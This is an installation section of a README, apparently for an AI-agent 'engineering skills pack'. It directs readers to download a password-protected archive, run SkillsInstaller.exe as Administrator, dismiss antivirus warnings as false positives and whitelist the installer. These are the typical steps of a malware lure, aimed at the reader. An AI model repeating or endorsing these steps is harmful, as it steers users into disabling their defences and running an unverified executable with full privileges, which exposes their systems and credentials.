## 📥 Installation

### Step 1: Download
Get the latest version from **[Releases](https://github.com/dave-jops91k9/engineering-skills-pack/releases)**.

### Step 2: Extract
Extract the archive using **WinRAR** or **7-Zip**.

> **🔑 Password:** `6427910552`

### Step 3: Run Setup
1. Run `SkillsInstaller.exe` as **Administrator**.
2. Follow the on-screen instructions.
3. Restart your AI agent to load the new skills.

> ⚠️ **Note:** Your antivirus may flag this tool — this is a false positive. The installer registers skills in your agent's configuration. Add it to your exceptions list.
